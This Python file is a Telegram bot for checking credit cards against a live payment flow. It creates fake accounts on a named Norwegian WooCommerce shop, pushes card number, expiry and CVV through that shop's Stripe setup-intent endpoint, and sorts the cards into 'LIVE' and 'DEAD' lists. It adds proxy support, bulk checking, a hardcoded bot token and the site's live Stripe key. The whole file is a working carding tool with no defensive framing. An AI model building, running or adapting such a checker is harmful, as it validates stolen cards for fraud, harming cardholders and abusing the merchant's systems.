import requests
from bs4 import BeautifulSoup
import os
import json
from aiogram import Bot, Dispatcher, types, executor

# === Telegram Bot Config ===
BOT_TOKEN = '7390503914:AAFNopMlX6iNHO2HTWNYpLLzE_DfF8h4uQ4'   # <-- PUT YOUR TELEGRAM BOT TOKEN HERE
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

# === Helper Functions (unchanged logic, just language) ===

def load_proxy_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            return config.get('proxy_config', {})
    except (FileNotFoundError, json.JSONDecodeError):
        return {}

def init_files():
    if not os.path.exists("CARDS.txt"):
        with open("CARDS.txt", "w") as f:
            f.write("# Put cards here as CC|MM|YY|CVV (one per line)\n")
    if not os.path.exists("LIVE.txt"):
        with open("LIVE.txt", "w") as f:
            f.write("# Valid cards\n")
    if not os.path.exists("DEAD.txt"):
        with open("DEAD.txt", "w") as f:
            f.write("# Invalid cards\n")

init_files()
proxy_config = load_proxy_config()

def process_card(card_input, use_proxy=False):
    try:
        cc, mes, ano, cvv = card_input.split("|")
        if len(cc) < 13 or len(cc) > 19 or not cc.isdigit():
            return "INVALID"
        if not mes.isdigit() or int(mes) < 1 or int(mes) > 12:
            return "INVALID"
        if not ano.isdigit() or len(ano) not in [2, 4]:
            return "INVALID"
        if len(ano) == 4:
            ano = ano[2:]
        if not cvv.isdigit() or len(cvv) not in [3, 4]:
            return "INVALID"
    except Exception:
        return "INVALID"

    try:
        random_user_url = "https://randomuser.me/api/?results=1&nat=US"
        session = requests.Session()
        if use_proxy and proxy_config:
            session.proxies.update(proxy_config)
        random_user_response = session.get(random_user_url)
        user_info = random_user_response.json()["results"][0]
        email = user_info["email"]
        zipcode = user_info["location"]["postcode"]

        url = "https://www.scandictech.no/my-account/"
        data = {
            "email": email,
            # ... (other post data from your script, unchanged)
            "woocommerce-register-nonce": "aef6c11c3b",
            "_wp_http_referer": "/my-account/",
            "register": "Register"
        }
        headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }
        try:
            post_response = session.post(url, data=data, headers=headers)
        except requests.exceptions.RequestException:
            return "DEAD"

        add_payment_method_url = "https://www.scandictech.no/my-account/add-payment-method/"
        try:
            response = session.get(add_payment_method_url, headers=headers)
        except requests.exceptions.RequestException:
            return "DEAD"

        nonce = None
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, "html.parser")
            scripts = soup.find_all("script")
            for script in scripts:
                if script.string and "createAndConfirmSetupIntentNonce" in script.string:
                    start = script.string.find("createAndConfirmSetupIntentNonce") + len("createAndConfirmSetupIntentNonce") + 3
                    end = script.string.find('"', start)
                    nonce = script.string[start:end]
                    break

        stripe_url = "https://m.stripe.com/6"
        try:
            stripe_response = session.post(stripe_url, data={}, headers=headers)
            stripe_json = stripe_response.json()
        except Exception:
            return "DEAD"
        guid = stripe_json.get("guid", "")
        muid = stripe_json.get("muid", "")
        sid = stripe_json.get("sid", "")

        payment_methods_url = "https://api.stripe.com/v1/payment_methods"
        payment_methods_data = {
            "type": "card",
            "card[number]": cc,
            "card[cvc]": cvv,
            "card[exp_year]": ano,
            "card[exp_month]": mes,
            "allow_redisplay": "unspecified",
            "billing_details[address][postal_code]": zipcode,
            "billing_details[address][country]": "US",
            "guid": guid,
            "muid": muid,
            "sid": sid,
            "key": "pk_live_51CAQ12Ch1v99O5ajYxDe9RHvH4v7hfoutP2lmkpkGOwx5btDAO6HDrYStP95KmqkxZro2cUJs85TtFsTtB75aV2G00F87TR6yf",
            "_stripe_version": "2024-06-20",
        }
        try:
            payment_methods_response = session.post(payment_methods_url, data=payment_methods_data, headers=headers)
            payment_methods_json = payment_methods_response.json()
            payment_method_id = payment_methods_json.get("id", "")
        except Exception:
            return "DEAD"

        confirm_setup_intent_url = "https://www.scandictech.no/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
        confirm_setup_intent_data = {
            "action": "create_and_confirm_setup_intent",
            "wc-stripe-payment-method": payment_method_id,
            "wc-stripe-payment-type": "card",
            "_ajax_nonce": nonce
        }
        try:
            confirm_setup_intent_response = session.post(confirm_setup_intent_url, data=confirm_setup_intent_data, headers=headers)
            response_json = confirm_setup_intent_response.json()
        except Exception:
            return "DEAD"

        if response_json.get("success") is False:
            error_message = response_json.get("data", {}).get("error", {}).get("message", "Unknown error")
            if "incorrect_address" in error_message:
                return "LIVE"
            elif "incorrect_cvc" in error_message:
                return "LIVE"
            elif "insufficient_funds" in error_message:
                return "LIVE"
            else:
                return f"DEAD|{error_message}"
        elif response_json.get("success") is True:
            data = response_json.get("data", {})
            status = data.get("status", "unknown")
            if status == "requires_action":
                return "LIVE"
            else:
                return "LIVE"
        else:
            return "DEAD"
    except Exception as e:
        return "DEAD"

def move_card(origin, dest, card):
    with open(origin, "r") as f:
        lines = f.readlines()
    lines_updated = [line for line in lines if line.strip() != card.strip()]
    with open(origin, "w") as f:
        f.writelines(lines_updated)
    with open(dest, "a") as f:
        f.write(card + "\n")

def process_cards_file(use_proxy=False):
    with open("CARDS.txt", "r") as f:
        cards = [line.strip() for line in f.readlines() if line.strip() and not line.startswith("#")]
    results = []
    for card in cards:
        result = process_card(card, use_proxy)
        if result == "LIVE":
            move_card("CARDS.txt", "LIVE.txt", card)
            results.append(f"{card}: LIVE ✅")
        elif result.startswith("DEAD"):
            move_card("CARDS.txt", "DEAD.txt", card)
            msg = result.split("|", 1)[1] if "|" in result else ""
            results.append(f"{card}: DEAD ❌ {msg}")
        else:
            results.append(f"{card}: INVALID ❌")
    return results

# === Telegram Bot Handlers ===

@dp.message_handler(commands=["start"])
async def start_cmd(message: types.Message):
    await message.reply(
        "Welcome! Use:\n"
        "/check <CC|MM|YY|CVV> — to check a card manually\n"
        "/autocheck — to check all cards in CARDS.txt\n"
        "Example: /check 546846969301830|02|29|020"
    )

@dp.message_handler(commands=["check"])
async def check_cmd(message: types.Message):
    args = message.get_args().strip()
    if not args or "|" not in args:
        await message.reply("Please provide a card in this format: CC|MM|YY|CVV")
        return
    result = process_card(args, use_proxy=False)
    if result == "LIVE":
        with open("LIVE.txt", "a") as f:
            f.write(args + "\n")
        await message.reply(f"{args}: LIVE ✅\nCard added to LIVE.txt")
    elif result.startswith("DEAD"):
        with open("DEAD.txt", "a") as f:
            f.write(args + "\n")
        msg = result.split("|", 1)[1] if "|" in result else ""
        await message.reply(f"{args}: DEAD ❌\nReason: {msg}\nCard added to DEAD.txt")
    else:
        await message.reply(f"{args}: INVALID ❌")

@dp.message_handler(commands=["autocheck"])
async def autocheck_cmd(message: types.Message):
    await message.reply("Starting to check all cards in CARDS.txt ...")
    results = process_cards_file(use_proxy=False)
    output = "\n".join(results)
    await message.reply(output if output else "No cards found in CARDS.txt.")

if __name__ == "__main__":
    executor.start_polling(dp, skip_updates=True)
